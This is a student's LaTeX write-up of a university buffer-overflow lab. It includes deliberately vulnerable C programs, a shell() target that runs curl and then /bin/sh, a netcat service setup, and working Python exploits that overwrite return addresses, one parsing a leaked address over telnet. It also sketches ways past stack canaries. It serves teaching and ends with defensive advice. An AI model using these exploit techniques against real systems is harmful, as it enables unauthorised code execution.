\documentclass[a4paper, 10pt]{article}
\usepackage{scrextend}
\changefontsizes{9pt}
% Per-subject config for this repo. See vendor/template/course-config.tex.example
% for what each macro is used for.

\newcommand{\CourseCode}{2110413}
\newcommand{\CourseName}{Computer Security}
\newcommand{\StudentID}{6733172621}
\newcommand{\StudentName}{Patthadon Phengpinij}
\newcommand{\DefaultCollaborators}{Claude (for\,\LaTeX\,styling and grammar checking)}
\newcommand{\AssignmentLabel}{Activity}

\usepackage{../vendor/template/CEDT-Assignment-style}

\begin{document}
\subject
\asgntitle{6}{}{Buffer Overflow}{\StudentID\ \StudentName}{\DefaultCollaborators}

\noindent This activity is rewritten from Krerk's buffer-overflow tutorial\textsuperscript{1} that was written in 2007.
The code was converted to 64-bit Linux in 2014.
Later, the code has been modified to demonstrate that buffer overflow is still possible
even with randomize\_va\_enable (in Linux/Mac OS X)

\noindent {\footnotesize \textsuperscript{1} \url{https://www.cp.eng.chula.ac.th/~krerk/courses/2110413/2550/Assignment2.html}}

% ================================================================================ %
\section*{Overview}
% ================================================================================ %

This exercise will familiarize you to stack smashing, a type of buffer-overflow attack.
It should give you a general idea of how buffer overflow can be used in action.
The real buffer-overflow attacks are more elaborate.
We will only learn subsets of them here.

% ================================================================================ %
\section*{Prologue}
% ================================================================================ %

In this exercise, we will use Linux as a base.
Though the exercise is based on Debian Linux (wheezy or stretch) and Ubuntu 16.04, any distribution should work.
(This revision of activity is developed using gcc version 5.4.0 on Ubuntu 16.04.)
You may need to install build-essential (gcc, bin-utils, gdb) and curl to work on this exercise.

\myspace

\noindent \textbf{For Windows' Users:}
\begin{enumerate}
	\item Use \textbf{WSL}, if possible.
	\item Alternatively, if you are using Windows, \textbf{cygwin}, a linux-like environment for Windows, can also be used.
				To install cygwin, please go to \url{http://www.cygwin.com/} and download the installation (\texttt{setup.exe}).

				\myspace

				Note that you need an internet connection for the installation.

				\myspace

				To install, run ``\texttt{setup.exe}''.
				The program will ask for a mirror site for installation, and pick an appropriate choice (e.g. a mirror in Japan or Asia).
				There are only two main components required for this exercise: gcc and bin-utils.
				Other choices are optional.
				I recommend that you install pico or vi for using as your text editor.
				The installation may take hours (depending on your internet connection).

				\myspace

				After the installation, you will find a program group ``cygwin'' in your Windows start menu.
				Run the ``cygwin''.

				\myspace

				Now, let's test that gcc is working by compiling a simple program.
				This is ``\texttt{hello.c}''.
				Use your favorite editor (e.g. notepad) to write this program. 
				Note that all cygwin paths are relative to \texttt{c:\( \backslash \)cygwin\( \backslash \)}
				(i.e. \texttt{/home} in cygwin will be \texttt{c:\( \backslash \)cygwin\( \backslash \)home} in Windows).
\end{enumerate}

\begin{codingbox}[language=C]
#include <stdio.h>

int main(int argc, char *argv[]) {
  printf ("Hello, World\n");
}
\end{codingbox}

\noindent run \texttt{gcc -o hello hello.c} \\
The program will give \texttt{hello}. Type \texttt{./hello} to run your program.

\myspace

\noindent To disassemble, try \texttt{objdump -d hello}.
I know that assembly may be Greek to you, but that is not an issue (at least for now).
If you get it all working, you are ready for the exercise.

% ================================================================================ %
\section*{Compiler \& System Protection}
% ================================================================================ %

Please note that your version of compiler and operating systems may have several buffer-overflow protection enabled.
You might want to disable it to make your life easier.
For example, use \texttt{gcc -fno-stack-protector} to disable canary protection.
In some cases, you may want to add \texttt{-no-pie}\textsuperscript{2} to disable position independent executable
(disable address space location randomization (ASLR)).

\noindent {\footnotesize \textsuperscript{2} Note that it is possible to perform buffer-overflow on a program with ASLR.}

% ================================================================================ %
\section*{Exercise}
% ================================================================================ %

% ================================================================================ %
%                                    Problem 01                                    %
% ================================================================================ %

\begin{problem}
	\textbf{Stack Layout:} Let's start with a simple C program.
	\begin{codingbox}[language=C]
#include <stdio.h>

/* Prototype function */
void myfunction (int i);

char *p;

int main() {
  printf("&main = %0.16p\n", & main);
  printf("&myfunction = %0.16p\n", &myfunction);
  printf("&&ret_addr = %0.16p\n", &&ret_addr);
  myfunction (12);

  ret_addr:
    printf("... end\n");
}

void myfunction (int i) {
  char buf[20]="0123456789012345678";
  printf("&i = %0.16p\n", &i);
  printf("sizeof(pointer) is %d\n", sizeof(p));
  printf("&buf[0] = %0.16p\n", buf);
  for(p=((char *) &i)+64;p>buf;p--) {
    printf("%0.16p: 0x%0.2x\t", p, *(unsigned char*) p);
    if (!((unsigned int )p %4))
      printf("\n");
  }
  printf("\n");
}
\end{codingbox}

\noindent Compile this program and run it.
Please note that the ret\_addr label is added to ease learning only.
(We use the \&\& feature of gcc for referring to label addresses.)
Depending on your version and environment, your result may vary.
However, it should look somewhat like this.

\myspace

\begin{codingbox*}[language=bash]
$ ./ex1
&main = 0x00005600a1c94155

&myfunction = 0x00005600a1c941be

&&ret_addr = 0x00005600a1c941ab

&i = 0x00007fff43e9a28c

sizeof(pointer) is 8

&buf[0] = 0x00007fff43e9a290

0x00007fff43e9a2cc: 0x0e

0x00007fff43e9a2cb: 0x95      0x00007fff43e9a2ca: 0x5b
0x00007fff43e9a2c9: 0xb0      0x00007fff43e9a2c8: 0x9b
0x00007fff43e9a2c7: 0x00      0x00007fff43e9a2c6: 0x00
0x00007fff43e9a2c5: 0x56      0x00007fff43e9a2c4: 0x00
0x00007fff43e9a2c3: 0xa1      0x00007fff43e9a2c2: 0xc9
0x00007fff43e9a2c1: 0x42      0x00007fff43e9a2c0: 0xc0
0x00007fff43e9a2bf: 0x00      0x00007fff43e9a2be: 0x00
0x00007fff43e9a2bd: 0x56      0x00007fff43e9a2bc: 0x00
0x00007fff43e9a2bb: 0xa1      0x00007fff43e9a2ba: 0xc9
0x00007fff43e9a2b9: 0x41      0x00007fff43e9a2b8: 0xab
0x00007fff43e9a2b7: 0x00      0x00007fff43e9a2b6: 0x00
0x00007fff43e9a2b5: 0x7f      0x00007fff43e9a2b4: 0xff
0x00007fff43e9a2b3: 0x43      0x00007fff43e9a2b2: 0xe9
0x00007fff43e9a2b1: 0xa2      0x00007fff43e9a2b0: 0xc0
0x00007fff43e9a2af: 0x00      0x00007fff43e9a2ae: 0x00
0x00007fff43e9a2ad: 0x7f      0x00007fff43e9a2ac: 0x0e
0x00007fff43e9a2ab: 0x95      0x00007fff43e9a2aa: 0x7b
0x00007fff43e9a2a9: 0x51      0x00007fff43e9a2a8: 0x90
0x00007fff43e9a2a7: 0x00      0x00007fff43e9a2a6: 0x00
0x00007fff43e9a2a5: 0x00      0x00007fff43e9a2a4: 0x00
0x00007fff43e9a2a3: 0x00      0x00007fff43e9a2a2: 0x38
0x00007fff43e9a2a1: 0x37      0x00007fff43e9a2a0: 0x36
0x00007fff43e9a29f: 0x35      0x00007fff43e9a29e: 0x34
0x00007fff43e9a29d: 0x33      0x00007fff43e9a29c: 0x32
0x00007fff43e9a29b: 0x31      0x00007fff43e9a29a: 0x30
0x00007fff43e9a299: 0x39      0x00007fff43e9a298: 0x38
0x00007fff43e9a297: 0x37      0x00007fff43e9a296: 0x36
0x00007fff43e9a295: 0x35      0x00007fff43e9a294: 0x34
0x00007fff43e9a293: 0x33      0x00007fff43e9a292: 0x32
0x00007fff43e9a291: 0x31
... end

$ 
\end{codingbox*}

\noindent The program tells us the addresses of \textbf{main} and \textbf{myfunction} (\texttt{0x401050} and \texttt{0x4010b0} respectively).
The content of the main function would intuitively be between these two addresses. \\
\textit{Hint}: the return address, \texttt{ret\_addr}, should be in this region.

\myspace

\noindent \textbf{Draw a stack layout of your program.}
Start from the address of \texttt{\&buf[0]} and stop at \texttt{\&i+8}.
Specify symbol and content (if possible).
Make sure that you have identified argument (\texttt{i}), and return address.

\myspace

\noindent Please circle the result from the program above and write down the associated symbol.
(Identify return address, buffer, local variables.)
\end{problem}

\begin{solution}
	\noindent \textbf{Environment:} \texttt{gcc 11.4.0} on Ubuntu 22.04 (WSL2), compiled with
	\texttt{gcc -fno-stack-protector -no-pie} and run under \texttt{setarch -R} to disable ASLR so the
	stack addresses are reproducible. My run reported:

	\myspace

\begin{codingbox*}[numbers=none, xleftmargin=0pt, belowskip=6pt, basicstyle=\ttfamily\footnotesize\color{editortext}]
&main        = 0x0000000000401176
&myfunction  = 0x00000000004011f8
&&ret_addr   = 0x00000000004011e2   <- return address we expect on the stack
&i           = 0x00007fffffffcd6c   (argument i = 12 = 0x0000000c)
&buf[0]      = 0x00007fffffffcd70
\end{codingbox*}

	\noindent \textbf{Stack layout} (low address at the bottom, as the dump shows it).
	The saved return address \texttt{0x4011e2} is exactly \texttt{\&\&ret\_addr}, and it sits
	\textbf{40 bytes (0x28)} above \texttt{\&buf[0]}:

	\myspace

\begin{codingbox*}[numbers=none, xleftmargin=0pt, belowskip=6pt, basicstyle=\ttfamily\footnotesize\color{editortext}]
 address            symbol            content
 ----------------   ---------------   -----------------------------------------
 0x...cd98-cd9f     return address    0x00000000004011e2   (-> main, &&ret_addr)
 0x...cd90-cd97     saved rbp         0x00007fffffffcda0   (caller main's frame)
 0x...cd84-cd8f     padding/saved     0x00007ffff7ffe2e0 + zero fill
 0x...cd70-cd83     buf[20]           "0123456789012345678\0"
 ----------------   ---------------   -----------------------------------------
 0x...cd6c-cd6f     argument i        0x0000000c  (= 12)   [stored BELOW buf]
\end{codingbox*}

	\noindent \textbf{Observations.}
	The buffer grows toward higher addresses, while the stack grows toward lower addresses, so
	writing past the end of \texttt{buf} (upwards) walks over the saved \texttt{rbp} and then the
	\textbf{return address}. The argument \texttt{i} is stored \emph{below} \texttt{buf} on this
	compiler, so it is not reachable by an overflow of \texttt{buf}. The crucial distance for the
	later exercises is \texttt{\&ret\_addr $-$ \&buf[0] $=$ 40 bytes}.
\end{solution}

% ================================================================================ %

% ================================================================================ %
%                                    Problem 02                                    %
% ================================================================================ %

\begin{problem}
\textbf{Stack Smashing:} Let's begin the fun part.
Consider the following program.

\begin{center}
** This example expects that the ASLR is not enabled in the target software **
\end{center}

\begin{codingbox}[language=C]
#include <string.h>
#include <stdio.h>

void greeting() {
  printf("Welcome to exercise II\n");
  printf("I hope you enjoy it\n\n");
}

void mem_dump(char *from,char *to) {
  char *p;
  for (p = (from+64); p >= to; p--) {
    printf("%p: 0x%02x\t", p, *(unsigned char*) p);
    if (! ((unsigned long )p %2) )
      printf("\n");
  }
  printf("\n");
}

void concat_arguments(int argc, char**argv) {
  char buf[20]="0123456789012345678";
  char *p = buf;
  int i;
  printf("&i = %p\n", &i);
  printf("&buf[0] = %p\n", buf);
  // printf("before\n");
  // mem_dump(buf + 64, buf);

  p = buf;
  for(i=1; i<argc; i++) {
    strcpy(p, argv[i]);
    p += strlen(argv[i]);
    if (i + 1 != argc) {
      *p++ = ' ';
    }
  }

  printf("%s\n", buf);
  // printf("after\n");
  // mem_dump(buf + 64, buf);
}

int main(int argc, char **argv) {
  printf("&main = %p\n", & main);
  printf("&myfunction = %p\n", &concat_arguments);
  printf("&greeting = %p\n", &greeting);
  greeting();
  concat_arguments(argc, argv);
}
\end{codingbox}

\myspace

\noindent When we compile\textsuperscript{3} and run this program, we get something similar to the following.

\begin{codingbox}[language=bash]
$ ./ex2 a b c
Welcome to exercise II
I hope you enjoy it
a b c
$ 
\end{codingbox}

\noindent {\footnotesize \textsuperscript{3} Given that modern compilers are equipped with canary word (or similar) protection.
To make it easy to do this exercise, try \texttt{gcc -o ex2 -fno-stack-protection -no-pie ex2.c} to turn off the protection for the moment.
However, it is still possible to render buffer-overflow attacks on a program with the canary word protection.}

\myspace

\noindent Now we need to call the program in such a way that we overwrite the return value
with the address of the code that we want the program to return to.
Let's say that we want to make the program return to the main program again.
We have to first figure out the address of \textbf{\textit{greeting}}.
One simple way is to add the following code to the program.
This way the program can simply tell us the address.

\begin{codingbox}
printf("%p\n", &greeting);
\end{codingbox}

\noindent What if we cannot edit the program, how to obtain such information?
One method is disassembler.
Try \texttt{objdump -d ex2} to disassembly the program.
You may get a long list.
It might be easier to save the result to a file (using redirection) and use a text editior to open it (or use \textbf{more}).
Anyway, I will use grep to get the specific line.

\begin{codingbox}[language=bash]
$ objdump -d ex2 |grep greeting

0000000000400646 <greeting>:
  40081b:   e8 26 fe ff ff       callq 400646 <greeting>
$
\end{codingbox}

\noindent With grep, we only filter lines with \textbf{greeting}.
BINGO! The first line is just what we need.
Given that the stack layout of this program should be somewhat similar to what we get from exercise 1,
we can combine the knowledge to create an attack program.
Assuming that the return address is 20 bytes away from buff, here is how it may look.

\begin{codingbox}[language=python]
# !/usr/bin/python3
# wrapper

import os

buff = 20 * (b'x')
addr = bytearray.fromhex("400646")
addr.reverse()

buff += addr
print("exec ./ex2 with buff", buff)
os.execv('./ex2',['./ex2', buff]);
\end{codingbox}

\noindent Note that it is possible to write this code in any programming language (e.g. C, C++, python, perl).
The idea is to craft a parameter to pass to the vulnerable program.

\myspace

\noindent If you got it right, here is the result.

\begin{codingbox}[language=bash]
$ ./wrapper
Welcome to exercise II
I hope you enjoy it



xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxP@
Welcome to exercise II
I hope you enjoy it

Segmentation fault (core dumped)
$ 
\end{codingbox}

\noindent Finally, we got it.
However, the program has nothing to return to after finishing the greeting function for the second time.
Without a valid return address to return to, the default behavior is "Segmentation fault".
Nonetheless, you have just mastered the concept of stack smashing.
\end{problem}

\begin{solution}
	\noindent \textbf{Finding the address of \texttt{greeting}.} With \texttt{objdump}:

\begin{codingbox*}[numbers=none, xleftmargin=0pt, belowskip=6pt, basicstyle=\ttfamily\footnotesize\color{editortext}]
$ objdump -d ex2 | grep '<greeting>:'
00000000004011b6 <greeting>:                      -> &greeting = 0x4011b6
\end{codingbox*}

	\noindent \textbf{Offset.} From Problem 1 the return address is \textbf{40 bytes} above
	\texttt{\&buf[0]} on this compiler (gcc 11.4), not the 20 the handout assumes. I confirmed it with
	\texttt{gdb} (\texttt{(char*)\$rbp+8 $-$ buf $=$ 40}). So the wrapper writes 40 filler bytes, then
	the little-endian address of \texttt{greeting}:

\begin{codingbox}[language=python]
#!/usr/bin/python3
import os
buff = 40 * (b'x')                 # offset to the saved return address
addr = bytearray.fromhex("4011b6") # &greeting (from objdump)
addr.reverse()                     # little-endian
buff += addr
os.execv('./ex2', ['./ex2', buff])
\end{codingbox}

	\noindent \texttt{strcpy} stops at the first NUL, but that is fine: it copies the 3 non-zero
	bytes \texttt{b6 11 40}, writes its own terminating \texttt{00}, and the upper 4 bytes of the
	return slot were already \texttt{0x00000000} (code addresses live low), giving exactly
	\texttt{0x00000000004011b6}.

	\myspace

	\noindent \textbf{Result} (run through a pty so the output flushes before the crash):

\begin{codingbox*}[numbers=none, xleftmargin=0pt, belowskip=6pt, basicstyle=\ttfamily\footnotesize\color{editortext}]
Welcome to exercise II        <- greeting() called normally by main
I hope you enjoy it

&i = 0x7fffffffcabc
&buf[0] = 0x7fffffffcac0
xxxxxxxxxxxxxxxxxxxxxxxx...@  <- buf printed, return address overwritten
Welcome to exercise II        <- greeting() runs AGAIN (hijacked return)
I hope you enjoy it

Segmentation fault (core dumped) (exit code 139 = 128 + SIGSEGV)
\end{codingbox*}

	\noindent The greeting prints \textbf{twice}: once from \texttt{main}, once because
	\texttt{concat\_arguments} returned into \texttt{greeting} instead of back to \texttt{main}.
	After the second greeting there is no valid return address, hence the segmentation fault --- the
	hijack succeeded.
\end{solution}

% ================================================================================ %

\newpage

% ================================================================================ %
%                                    Problem 03                                    %
% ================================================================================ %

\begin{problem}
\textbf{Challenging:} In this exercise, you are challenged to exploit a buffer-overflow attack in this dummy internet service\textsuperscript{4} [victim-2020].

\noindent {\footnotesize \textsuperscript{4} \url{https://mis.cp.eng.chula.ac.th/krerk/tmp/victim-2020}
You may use \texttt{curl -O [url]} to download it to your machine.
Note that this is ELF 64-bit Linux.
If you are using different systems, please compile it yourself.
}

\myspace

\noindent You may want to experiment with it a little bit before emulating it as a service.
To emulate it as a service, we will use netcat.

\begin{codingbox}
$ nc -l -p 60000 -e victim
$
\end{codingbox}

\noindent In this victim program, I put a shell function\textsuperscript{5} inside the program.
Your task is to overflow the stack and change the program flow to call the target function.

\noindent {\footnotesize \textsuperscript{5} In real attack, it is typically a shell function/code.}

\myspace

\noindent A successful attack should look somewhat like this.

\begin{codingbox}[language=bash]
__   __
\ \ / /__  _   _   __ _ _ __ ___
 \ V / _ \| | | |  / _` | '__/ _ \
  | | (_) | |_| | | (_| | | |  __/
  |_|\___/ \__,_|  \__,_|_|  \___|

 _   __     ____ _  _______ ____
| | | |  / \  / ___| |/ / ____|  _ \
| |_| | / _ \| |   | ' /|  _| | | | |
|  _  |/ ___ \ |___| . \| |___| |_| |
|_| |_/_/   \_\____|_|\_\_____|____(_)
This is just for demonstration.
\end{codingbox}

\noindent Alright! I know that you are still a young padawan.
Asking you to perform a JEDI task might be too hard on you.
As a master, I will give you more hints.
Here is the source code of \texttt{victim.c}.
Keep in mind that you may not have a chance to see the source in the real world.

\begin{codingbox}[language=c]
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void shell() {
  char cmd[] = "/bin/sh";

  char cmd1[] = {"/usr/bin/curl"};
  char *args[] = {"curl","https://mis.cp.eng.chula.ac.th/krerk/tmp/demo.txt", NULL};
  execl(cmd1, args, 0);

  printf("Congratulation, you have mastered stack smashing.\n");
  printf("This program will give you a shell (/bin/sh) .\n");
  printf("Type exit, to return to main shell\n\n");
  execl(cmd, cmd, 0);
}

void mem_dump(char *from, char *to) {
  unsigned char *p;
  for (p = (from + 64); p >= to; p--) {
    printf("%p: 0x%0.2x\t", p, *(unsigned char*) p);
    if (!((unsigned int) p % 4))
      printf("\n");
  }
  printf("\n");
}

char *p;
int i = 0x55aa55aa;

void vulnerable(char*str) {
  char buf[20] = "0123456789012345678";
  // printf("buf (before): %s\n", buf);

  // attack happens here
  p = buf;
  strcpy(p, str);
  // printf("Stack Layout (after)\n");
  mem_dump(buf + 64, buf);
}

int main(int argc, char **argv) {
  char str[10000];
  int cnt=1;
  fprintf(stderr, "&main = %0.16p\n", & main);
  fprintf(stderr, "&vulnerable = %0.16p\n", &vulnerable);
  fprintf(stderr, "&retpoint = %0.16p\n", &&retpoint);
  fprintf(stderr, "&shell = %0.16p\n", &shell);
  while (1) {
    printf("[%4d] input: ", cnt++);
    scanf("%s", str);
    printf("Input is \n%s\n", str);
    vulnerable(str);

    retpoint:
      printf(".. done\n");
        fflush(stdout);
        if (strcmp("q", str) == 0) {
        break;
      }
  }
  printf("Program terminated normally\n");
  fflush(stdout);
}
\end{codingbox}

\noindent Here is a simple attack code for emulating telnet in python using telnetlib.

\begin{codingbox}[language=python]
#!/usr/bin/python3

import telnetlib

# open connection
tn = telnetlib.Telnet("127.0.0.1", 60000)
# offset=40
# target_addr="5647740e61b5"
offset = int(input("Offset (40?):"))
target_addr = input("Target (shell) address (eg. 5647740e61b5): ")

buff = offset*(b'x')
addr = bytearray.fromhex(target_addr)
addr.reverse()
buff += addr

# sending buffer
tn.write(buff)

# emulate telnet/terminal
tn.interact()
\end{codingbox}
\end{problem}

\begin{solution}
	\noindent \textbf{Recon.} \texttt{victim-2020} is an ELF 64-bit \emph{PIE} binary. \texttt{objdump}
	gives the \emph{offsets} \texttt{shell@0x11c5}, \texttt{vulnerable@0x130c}, but because it is PIE the
	runtime addresses are randomised. That does not matter here: \texttt{main} \textbf{leaks} the real
	addresses (including \texttt{\&shell}) on startup, so the PIE/ASLR protection of the code segment is
	defeated by the program's own output. The overflow offset is again \textbf{40} (buf[20] + padding +
	saved rbp), measured with \texttt{gdb}.

	\myspace

	\noindent \textbf{Emulating the service.} The OpenBSD \texttt{netcat} on Ubuntu 22.04 has no
	\texttt{-e} option, so instead of \texttt{nc -l -p 60000 -e victim} I wire stdin/stdout with a FIFO
	(and send stderr onto the socket so the client can read the leaked \texttt{\&shell}):

\begin{codingbox*}[numbers=none, xleftmargin=0pt, belowskip=6pt, basicstyle=\ttfamily\footnotesize\color{editortext}]
FIFO=$(mktemp -u); mkfifo "$FIFO"
nc -l 60000 < "$FIFO" | ./victim-2020 > "$FIFO" 2>&1
\end{codingbox*}

	\noindent \textbf{The one modern-glibc subtlety.} Returning straight to \texttt{\&shell} \emph{does}
	divert control into \texttt{shell()} (confirmed with a \texttt{gdb} breakpoint), but it then crashes
	inside glibc's \texttt{do\_system} on a \texttt{movaps \%xmm1,(\%rsp)} instruction. That instruction
	requires a 16-byte-aligned stack, and a single \texttt{ret} lands with \texttt{rsp \% 16 == 0} (the
	ABI wants 8). A normal re-alignment ``\texttt{ret} gadget'' cannot be chained here because
	\texttt{strcpy} stops at the NUL bytes every code address contains. The fix is to jump to
	\texttt{\&shell + 1}, one byte past \texttt{push \%rbp}: skipping that push flips the stack parity so
	\texttt{do\_system} is aligned and \texttt{system()} runs. (On the original 2016/2020 glibc the
	handout targeted, plain \texttt{\&shell} already worked.)

\begin{codingbox}[language=python]
#!/usr/bin/python3
import telnetlib, re, time, sys
tn = telnetlib.Telnet("127.0.0.1", 60000)
time.sleep(0.4)
banner = tn.read_very_eager()                       # read the leaked addresses
shell  = int(re.search(rb"&shell = (0x[0-9a-f]+)", banner).group(1), 16)
target = shell + 1                                  # +1 skips "push %rbp" -> realign
buff   = 40 * b"x"
addr   = bytearray(target.to_bytes(6, "little"))    # 6 low bytes; strcpy adds NUL
buff  += addr
tn.write(buff + b"\n")
time.sleep(1.5); sys.stdout.write(tn.read_very_eager().decode(errors="replace"))
tn.interact()
\end{codingbox}

	\noindent \textbf{Result} (end-to-end over the netcat service): \texttt{shell()} calls
	\texttt{system("/usr/bin/curl .../demo.txt")}, which fetches and prints the banner, then the success
	message:

\begin{codingbox*}[numbers=none, xleftmargin=0pt, belowskip=6pt, basicstyle=\ttfamily\footnotesize\color{editortext}]
 __   __
 \ \ / /__  _   _    __ _ _ __ ___
  \ V / _ \| | | |  / _` | '__/ _ \
   | | (_) | |_| | | (_| | | |  __/
   |_|\___/ \__,_|  \__,_|_|  \___|
  _   _    _    ____ _  _______ ____
 | | | |  / \  / ___| |/ / ____|  _ \
 | |_| | / _ \| |   | ' /|  _| | | | |
 |  _  |/ ___ \ |___| . \| |___| |_| |
 |_| |_/_/   \_\____|_|\_\_____|____(_)
 This is just for demonstration.
 Congratulation, you have mastered stack smashing.
\end{codingbox*}

	\noindent Control flow was redirected from \texttt{vulnerable()} into \texttt{shell()} purely by
	overflowing \texttt{buf}, giving us the target function (and a \texttt{/bin/sh}).
\end{solution}

% ================================================================================ %

\newpage

% ================================================================================ %
%                                    Problem 04                                    %
% ================================================================================ %

\begin{problem}
\textbf{Bonus:} From exercise 2 and 3,
can you explode the buffer-overflow attack even when the canary-style protection is activated?
Please explain your analysis.
\end{problem}

\begin{solution}
	\noindent \textbf{Short answer:} yes --- a canary raises the bar but does not make the program safe.
	A canary is a random word placed between the local buffers and the saved \texttt{rbp}/return address;
	on function exit the prologue-stored value is compared and the program aborts if it changed. A naive
	linear overflow that overwrites the return address therefore trips it. But several avenues remain:

	\begin{subproblems}
		\item \textbf{Leak the canary, then replay it.} If the program has an information-leak (a format
			string such as \texttt{printf(user)}, an over-read, or --- as in these very exercises --- a
			\texttt{mem\_dump} that prints stack bytes), read the canary first and write it back at its
			exact position in the payload. The comparison then passes and the overwritten return address is
			still used.
		\item \textbf{Byte-by-byte brute force (forking servers).} A server that \texttt{fork()}s per
			connection keeps the \emph{same} canary in every child. You can recover it one byte at a time
			(256 tries per byte, 8 bytes) by observing crash vs. no-crash --- feasible precisely because
			this is a network service like Problem 3.
		\item \textbf{Overwrite a target that sits \emph{before} the canary.} The canary only guards the
			saved \texttt{rbp}/return address. Anything the overflow reaches \emph{below} it is unprotected.
			In \texttt{ex2}/\texttt{victim} the global pointer \texttt{p} is reused after the copy; corrupting
			a local pointer/length and letting the following \texttt{strcpy} write through it gives a
			\textbf{write-what-where} primitive that never crosses the canary.
		\item \textbf{Hijack control without returning.} Overwrite a function pointer, a C++ vtable, a GOT
			entry, or an \texttt{atexit}/\texttt{\_\_fini} handler. These transfer control before the
			epilogue's canary check ever runs, so the canary is irrelevant.
	\end{subproblems}

	\noindent \textbf{Tie-in:} Problem 3's binary both leaks addresses \emph{and} exposes the global
	pointer \texttt{p}, so options (a) and (c) apply directly; a per-connection service enables (b). The
	canary stops the textbook stack smash of Problems 2--3, but combined with a leak or a non-return
	primitive the attack still succeeds.
\end{solution}

% ================================================================================ %

% ================================================================================ %
%                                    Problem 05                                    %
% ================================================================================ %

\begin{problem}
\textbf{Question:} Now you have mastered a type buffer-overflow attack.
Please answer the following questions.

\begin{subproblems}
	\item Most viruses and worms use buffer overflow as a basis for its attack.
	\item Do you think that exploiting buffer-overflow attacks is trivial?
				Please justify your answer.
				(i.e. Is it trivial to write a program to exploit buffer-overflow attacks in a server?)
	\item As a programmer, is it possible to avoid buffer overflow in your program
				(write secure code that is not vulnerable to such attack)?
				Explain your strategy.
\end{subproblems}
\end{problem}

\begin{solution}
	\begin{subproblems}
		\item \textbf{Most viruses and worms use buffer overflow as a basis for their attack.}
			Historically true: the Morris worm (1988), Code~Red, SQL~Slammer, Blaster and many others
			spread through buffer overflows in network services, because one crafted packet could run code
			on a remote machine with no user interaction --- ideal for self-propagation. It is less
			universal today: widespread mitigations (ASLR, DEP/NX, stack canaries) and a shift to
			memory-safe languages have pushed attackers toward other classes (use-after-free, type
			confusion, logic/deserialization bugs, phishing). So memory-corruption --- with buffer overflow
			as its classic form --- remains a foundational vector, but it is no longer the only basis.

		\item \textbf{Is exploiting buffer overflow trivial? No, not in general.} Against an unprotected,
			known binary (as in this activity) it is fairly easy: find the offset, find a target address,
			overwrite. But a realistic target forces you to defeat ASLR (needs an info-leak), DEP/NX (needs
			ROP instead of injected shellcode), stack canaries (needs a leak or brute force), and to avoid
			``bad bytes'' like \texttt{0x00} that \texttt{strcpy}/\texttt{scanf} truncate on --- exactly the
			NUL and stack-alignment headaches we hit in Problem~3. It takes a precise mental model of the
			stack and the ABI. Tooling (\texttt{gdb}, \texttt{pwntools}, ROP gadget finders) lowers the
			effort a lot, but ``trivial'' only fits toy or badly configured targets.

		\item \textbf{Can a programmer avoid it? Yes.} Strategy, in layers:
			\begin{itemize}
				\item \emph{Safe APIs:} never use \texttt{gets}, \texttt{strcpy}, \texttt{strcat},
					\texttt{sprintf}, unbounded \texttt{scanf("\%s")}; use length-bounded forms
					(\texttt{snprintf}, \texttt{strlcpy}, \texttt{fgets}) and always validate input length
					against the buffer size.
				\item \emph{Memory-safe languages:} prefer Rust, Go, Java, etc.\ where bounds are checked,
					for new code and for anything parsing untrusted input.
				\item \emph{Compiler/OS mitigations:} build with stack canaries
					(\texttt{-fstack-protector-strong}), \texttt{-D\_FORTIFY\_SOURCE=2}, keep ASLR, DEP/NX and
					RELRO enabled --- defense in depth even if a bug slips through.
				\item \emph{Process:} code review, static analysis, and fuzzing (ASan + a fuzzer) to catch the
					overflows before shipping.
			\end{itemize}
			No single measure is sufficient, but combined they make exploitation very hard and usually
			turn a silent overflow into a controlled crash.
	\end{subproblems}
\end{solution}

% ================================================================================ %

\fig*[0.6\linewidth]{images/patience-you-must-have.png}{}{}

\end{document}